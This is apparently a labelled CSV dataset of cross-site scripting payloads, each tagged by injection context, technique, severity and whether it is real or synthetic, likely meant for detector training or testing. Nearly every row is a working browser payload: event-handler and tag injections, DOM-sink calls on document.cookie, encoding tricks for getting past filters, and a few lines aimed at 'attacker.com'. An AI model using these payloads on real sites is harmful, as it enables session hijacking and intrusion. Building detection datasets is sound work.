payload,context,technique,severity,length,source
%3Canimatemotion x=y onsecuritypolicyviolation=console.log('XSS')%3E,tag_injection,synthetic,medium,68,synthetic
ondragover=confirm(%27XSS%27),event_handler,synthetic,medium,29,synthetic
%3Cscript%3Ewindow['confirm']('XSS')%3C/script%3E,script_injection,synthetic,low,49,synthetic
"<style>:target {color:red;}</style><tbody id=x style=""transition:color 1s"" ontransitionstart=alert(1)></tbody>",tag_injection,none,medium,110,real
${{\u0061lert(1)}},template_injection,synthetic,low,18,synthetic
""" onselect=confirm(location.hash) """,attribute_escape,synthetic,medium,35,synthetic
'%3E%3Cimg src=x onmousedown=confirm(document.domain)%3E,attribute_escape,synthetic,medium,56,synthetic
'><img src=x ongesturestart=alert(location.hash)>,attribute_escape,synthetic,medium,49,synthetic
"""%3E%3Cbase onkeydown=alert('XSS')%3E",tag_injection,synthetic,medium,37,synthetic
"'><img src=x onpromptdismiss=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,77,synthetic
"<fieldset onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</fieldset>",tag_injection,none,medium,78,real
<marquee onpointerover=alert(1) style=display:block>AnonKryptiQuz</marquee>,tag_injection,none,medium,75,real
"<ruby onmouseleave=""alert(1)"">AnonKryptiQuz</ruby>",tag_injection,none,medium,50,real
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=confirm('//attacker.com/?c='+document.cookie)>"")",dom_sink,synthetic,high,107,synthetic
"<td onclick=""alert(1)"">AnonKryptiQuz</td>",tag_injection,none,medium,41,real
'%3E%3Cimg src=x onpromptdismiss=console.log('XSS')%3E,attribute_escape,synthetic,medium,54,synthetic
"<img src=""non-existent-image.jpg"" onerror=""alert(document.cookie);"" />",dom_sink,none,high,70,real
"""><b&#97;s&#101; onpoint&#101;rup=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,low,72,synthetic
"OnpAstE=jAvaScrIpt:prOmpT(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,56,synthetic
' ><svg ongestureend=\u0061lert(1)>,attribute_escape,synthetic,low,35,synthetic
\' OnmOusEwhEel=prOmpT('XSS')//,attribute_escape,synthetic,medium,31,synthetic
"<div draggable=""true"" contenteditable>drag me</div><title ondrop=alert(1) contenteditable style=display:block>drop here</title>",tag_injection,none,medium,127,real
ondr&#97;gst&#97;rt=confirm/**/(1),event_handler,synthetic,low,34,synthetic
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:prompt('XSS')""",dom_sink,synthetic,medium,57,synthetic
""" onreset=console.log('XSS') """,attribute_escape,synthetic,medium,30,synthetic
"<style>:target {color:red;}</style><footer id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></footer>",tag_injection,none,medium,116,real
"<u onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</u>",tag_injection,none,medium,55,real
%3Csource x=y oninput=alert(location.hash)%3E,tag_injection,synthetic,medium,45,synthetic
"<image3 draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</image3>",tag_injection,none,medium,90,real
"'><Img srC=x onCut=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,62,synthetic
"<noscript onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</noscript>",tag_injection,none,medium,77,real
OnpOinTerMovE=cOnsOle.loG(dOcuMenT.dOmaIn),event_handler,synthetic,medium,42,synthetic
<link x=y ondrop=prompt(document.domain)>,tag_injection,synthetic,medium,41,synthetic
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=pRomPt(DocUmeNt.CooKie)>"")",dom_sink,synthetic,high,85,synthetic
&#106;AvaScrIpt:coNsoLe.Log(1),js_uri,synthetic,medium,30,synthetic
<!--><a onmozfullscreenchange=\u0061lert(location.hash)>,tag_injection,synthetic,low,56,synthetic
"<a href=""javascript\x09:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
"""%3E%3Cdiv onwebkitfullscreenchange=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,76,synthetic
"<rt oncut=""alert(1)"" contenteditable>AnonKryptiQuz</rt>",tag_injection,none,medium,55,real
%22 oncanplay=confirm(location.hash) %22,attribute_escape,synthetic,medium,40,synthetic
<nav onpointerup=alert(1) style=display:block>AnonKryptiQuz</nav>,tag_injection,none,medium,65,real
"<noembed onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</noembed>",tag_injection,none,medium,67,real
<base ontransitionstart=prompt(location.hash)/>,tag_injection,synthetic,medium,47,synthetic
<strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus>,tag_injection,none,medium,70,real
document.write(%22<img src=x onerror=XMLHttpRequest(location.hash)>%22),dom_sink,synthetic,high,71,synthetic
"\%22 onpromptdismiss=prompt(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,60,synthetic
""" onmouseenter=\u0061lert(document.domain) """,attribute_escape,synthetic,low,44,synthetic
<form/onreset=console.log(document.domain)>,tag_injection,synthetic,medium,43,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><optgroup id=x style=""position:absolute;"" onanimationcancel=""print()""></optgroup>",tag_injection,none,low,185,real
' oNbeForEinPut=coNsoLe.Log('XSS') ',attribute_escape,synthetic,medium,36,synthetic
"""><svg onScroll=""javascript:alert(1)//",js_uri,none,medium,38,real
"<td draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</td>",tag_injection,none,medium,82,real
`><Img srC=x onWheEl=ProMpt('XSS')>,attribute_escape,synthetic,medium,35,synthetic
<tr	onanimationend=prompt(%27XSS%27)>,tag_injection,synthetic,medium,37,synthetic
<a onmozfullscreenchange=\u0061lert(location.hash)/>,tag_injection,synthetic,low,52,synthetic
`><Img srC=x onPoiNteRovEr=ConFirM(lOcaTioN.hAsh)>,attribute_escape,synthetic,medium,50,synthetic
ondr&#97;g&#101;nt&#101;r=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,68,synthetic
"<rt onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</rt>",tag_injection,none,medium,65,real
redirect.asp?url=javascript://%250Aalert(document.domain),dom_sink,url_encoding,medium,57,real
" onpagereveal=\u0061lert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,55,synthetic
"LocAtiOn=""jaVasCriPt:ConSolE.lOg(LocAtiOn.HasH)""",dom_sink,synthetic,high,48,synthetic
'><script>consol&#101;.log(docum&#101;nt.dom&#97;in)</script>,script_injection,synthetic,low,61,synthetic
"<style ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</style>",tag_injection,none,medium,91,real
"<button onmouseout=""alert(1)"">AnonKryptiQuz</button>",tag_injection,none,medium,52,real
"""><img src=x onerror=alert(1)>",attribute_escape,synthetic,medium,30,synthetic
"__proto__[""onpageshow""]=eval(document.cookie)",dom_sink,synthetic,high,45,synthetic
%27 ><svg onbegin=confirm(location.hash)>,attribute_escape,synthetic,medium,41,synthetic
"<source ondblclick=""alert(1)"">AnonKryptiQuz</source>",tag_injection,none,medium,52,real
"<textarea draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</textarea>",tag_injection,none,medium,72,real
' onscrollend=prompt(location.hash) ',attribute_escape,synthetic,medium,37,synthetic
"<div draggable=""true"" contenteditable>drag me</div><option ondrop=alert(1) contenteditable style=display:block>drop here</option>",tag_injection,none,medium,129,real
onwebkitanimationend=\u0061lert/*x*/(1),event_handler,synthetic,low,39,synthetic
"<marquee onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</marquee>",tag_injection,none,medium,72,real
"'><script>\u0061lert(String.fromCharCode(88,83,83))</script>",script_injection,synthetic,high,60,synthetic
<th onpointerdown=alert(1) style=display:block>AnonKryptiQuz</th>,tag_injection,none,medium,65,real
"&lt;A HREF=\""http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,89,real
"(n&#101;w Function(""prompt(docum&#101;nt.dom&#97;in)""))();",dom_sink,synthetic,medium,58,synthetic
"<div draggable=""true"" contenteditable>drag me</div><video2 ondrop=alert(1) contenteditable style=display:block>drop here</video2>",tag_injection,none,medium,129,real
"OncUt=JavAscRipT:pRomPt(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,54,synthetic
"on&#97;nim&#97;tionc&#97;nc&#101;l=confirm&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler,synthetic,low,90,synthetic
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onwebkitanimationend=""alert(1)""></thead>",tag_injection,none,medium,101,real
"<sourc&#101;	onvolum&#101;ch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,90,synthetic
"<iframe x=y ongestureend=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,68,synthetic
\' onpointerup=\u0061lert(1)//,attribute_escape,synthetic,low,30,synthetic
{{alert|constructor:'XSS'}},template_injection,synthetic,low,27,synthetic
"<style>:target {color: red;}</style><video id=x style=""transition:color 10s"" ontransitioncancel=print()></video>",tag_injection,none,low,112,real
\%27 onhashchange=console.log(document.domain)//,attribute_escape,synthetic,medium,48,synthetic
%3Cscript%3EFunction('confirm(1)')();%3C/script%3E,script_injection,synthetic,medium,50,synthetic
"<div draggable=""true"" contenteditable>drag me</div><video ondragover=alert(1) contenteditable style=display:block>drop here</video>",tag_injection,none,medium,131,real
""" ><svg oninput=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,low,59,synthetic
'><Img srC=x onFocUs=ConSolE.lOg(LocAtiOn.HasH)>,attribute_escape,synthetic,medium,48,synthetic
"&lt;A HREF=\""http&#58;//www&#46;google&#46;com&#46;/\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,81,real
{&#97;l&#101;rt docum&#101;nt.dom&#97;in},template_injection,synthetic,low,41,synthetic
`><img src=x ondrop=confirm(document.domain)>,attribute_escape,synthetic,medium,45,synthetic
""" onmouseover=confirm(location.hash) x=""",attribute_escape,synthetic,medium,40,synthetic
' ><svg onb&#101;for&#101;p&#97;st&#101;=&#97;l&#101;rt('XSS')>,attribute_escape,synthetic,low,63,synthetic
"<m&#101;t&#97;
ons&#101;curitypolicyviol&#97;tion=prompt('XSS')>",tag_injection,synthetic,medium,64,synthetic
"<spacer draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",tag_injection,none,medium,89,real
"%22 onfocus=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,58,synthetic
"<label onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</label>",tag_injection,none,medium,86,real
"\' ondblclick=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,70,synthetic
"setTimeout(""eval('//attacker.com/?c='+document.cookie)"",0)",dom_sink,synthetic,high,58,synthetic
ondrop=\u0061lert&#40;document.domain&#41;,event_handler,synthetic,low,42,synthetic
"<rt onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</rt>",tag_injection,none,medium,60,real
<script>alert('\u0031')</script>,script_injection,unicode_escape,medium,32,real
<!--><ObjEct onBefOrePasTe=ConFirM(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,52,synthetic
"<style>@keyframes slidein {}</style><details style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></details>",tag_injection,none,medium,168,real
<!--><table oninvalid=prompt('XSS')>,tag_injection,synthetic,medium,36,synthetic
"(neW FUncTioN(""ProMpt(doCumEnt.coOkiE)""))();",dom_sink,synthetic,high,44,synthetic
eval(%22alert(document.cookie)%22),dom_sink,synthetic,high,34,synthetic
%3Canimatemotion x=y onanimationiteration=console.log('XSS')%3E,tag_injection,synthetic,medium,63,synthetic
"<script>setTimeout('\u0061lert(location.hash)',0)</script>",script_injection,synthetic,low,58,synthetic
"<address draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</address>",tag_injection,none,medium,92,real
<article onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</article>,tag_injection,none,medium,80,real
"<shadow onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",tag_injection,none,medium,71,real
"<div
onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,101,synthetic
%3Cscript%3E/*/console.log(1)%3C/script%3E,script_injection,synthetic,medium,42,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onp&#97;g&#101;sw&#97;p"":&#101;v&#97;l})",dom_sink,synthetic,low,72,synthetic
OnpOinTerRawUpdAte=alErt/**/('XSS'),event_handler,synthetic,low,35,synthetic
%22><img src=x onanimationiteration=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,59,synthetic
<object/onvolumechange=\u0061lert(1)>,tag_injection,synthetic,low,37,synthetic
"#""><svg onload=alert(1)>",tag_injection,none,medium,24,real
&quot; onpopstate=\u0061lert(1) x=&quot;,attribute_escape,synthetic,low,40,synthetic
%27><img src=x ongotpointercapture=alert(document.domain)>,attribute_escape,synthetic,medium,58,synthetic
"<strike draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</strike>",tag_injection,none,medium,88,real
%3Cscript%3Eprompt`1`%3C/script%3E,script_injection,synthetic,low,34,synthetic
<ruby id=x tabindex=1 onbeforedeactivate=alert(1)></ruby><input autofocus>,tag_injection,none,medium,74,real
<script>alert`'XSS'`</script>,script_injection,synthetic,low,29,synthetic
<noembed onpointermove=alert(1) style=display:block>AnonKryptiQuz</noembed>,tag_injection,none,medium,75,real
%3csvg/onload=window%5b%22al%22+%22ert%22%5d1337`%3e,event_handler,url_encoding,low,52,real
"'%3E%3Cimg src=x ongotpointercapture=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,78,synthetic
	onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,71,synthetic
javascript:\u0061lert/*x*/(1),js_uri,synthetic,low,29,synthetic
<input onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</input>,tag_injection,none,medium,76,real
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=confirm(String.fromCharCode(88,83,83))>%22)",dom_sink,synthetic,high,108,synthetic
"<html onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</html>",tag_injection,none,medium,64,real
"`%3E%3Cimg src=x onscrollend=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,68,synthetic
<!--><ObjEct onMozFulLscReeNchAngE=cOnsOle.loG(1)>,tag_injection,synthetic,medium,50,synthetic
"<center oncontextmenu=""alert(1)"">AnonKryptiQuz</center>",tag_injection,none,medium,55,real
"<rb onmouseup=""alert(1)"">AnonKryptiQuz</rb>",tag_injection,none,medium,43,real
"Obj&#101;ct.&#97;ssign(window,{""ondr&#97;g&#101;nt&#101;r"":f&#101;tch})",dom_sink,synthetic,low,71,synthetic
"\"" on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh)//",attribute_escape,synthetic,low,57,synthetic
%27><img src=x onbegin=confirm(location.hash)>,attribute_escape,synthetic,medium,46,synthetic
"<var onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</var>",tag_injection,none,medium,67,real
<marquee onpopstate=alert(%27XSS%27)/>,tag_injection,synthetic,medium,38,synthetic
<embed x=y onmozfullscreenchange=console.log(document.domain)>,tag_injection,synthetic,medium,62,synthetic
"\"" onwebkitanimationend=prompt(1)//",attribute_escape,synthetic,medium,35,synthetic
%22><script onkeydown=confirm(document.domain)>,tag_injection,synthetic,medium,47,synthetic
&quOt; onPopStaTe=AleRt('XSS') x=&quOt;,attribute_escape,synthetic,medium,39,synthetic
<svg onbeforecopy=prompt(document.domain)/>,tag_injection,synthetic,medium,43,synthetic
\%22 oninput=console.log(document.domain)//,attribute_escape,synthetic,medium,43,synthetic
<frame onblur=alert(1) tabindex=1 id=x></frame><input autofocus>,tag_injection,none,medium,64,real
"<video oncontextmenu=""alert(1)"">AnonKryptiQuz</video>",tag_injection,none,medium,53,real
__proto__[%22ongesturestart%22]=eval(document.cookie+%27&loc=%27+location.href),dom_sink,synthetic,high,79,synthetic
